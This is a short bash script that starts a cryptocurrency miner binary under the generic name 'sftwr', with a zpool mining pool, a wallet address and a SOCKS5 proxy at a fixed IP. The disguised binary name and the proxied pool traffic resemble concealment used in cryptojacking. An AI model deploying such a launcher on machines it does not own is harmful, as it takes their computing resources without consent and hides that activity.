#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=D6ZLGf67ndSfdDZz2uPgLB2Hpi1MeuHnnD.bebel
PROXY=socks5://184.178.172.13:15311
./sftwr -a cpupower -o $POOL -u $WALLET -p c=DGB,zap=VRSC -x $PROXY
